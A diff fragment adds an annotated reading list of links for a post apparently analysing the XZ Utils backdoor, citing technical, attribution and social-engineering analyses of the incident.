+- **[Binarly — XZ backdoor analysis](https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor)** — independent extraction of the .o from a real distro `.deb`. Hash differs from xzre's; structure matches.
+- **[Thomas Roccia — XZ Outbreak infographic](https://infosec.exchange/@fr0gger/112189232773640259)** — single-page visual reference; the structural spine for this post.
+- **[Gynvael Coldwind — deep dive](https://gynvael.coldwind.pl/?id=782)** — second-source for the runtime payload analysis.
+- **[Lasse Collin — tukaani.org/xz-backdoor](https://tukaani.org/xz-backdoor/)** — the upstream maintainer's public statement.
+- **[LWN — A backdoor in xz](https://lwn.net/Articles/967180/)** — for the open-source-process angle.
+- **[Wired profile of Andres Freund](https://www.wired.com/story/jia-tan-xz-backdoor/)** — for one well-chosen pull-quote, not for technical detail.
+- **[Rhea Karty &amp; Simon Henniger — XZ Backdoor: Times, damned times, and scams](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and)** — the timezone, work-hours, and Chinese-holiday analysis cited in the Attribution section. Dartmouth + TU Munich, April 2024.
+- **[Hunted Labs — Where the Wild Things Are](https://www.huntedlabs.com/blog/where-the-wild-things-are-a-complete-analysis-of-jia-tans-github-history-and-the-xz-utils-software-supply-chain-breach)** — broader analysis of Jia Tan's GitHub history.
+- **[Securelist — Social engineering aspect of the XZ incident](https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/)** — Kaspersky's social-engineering breakdown.
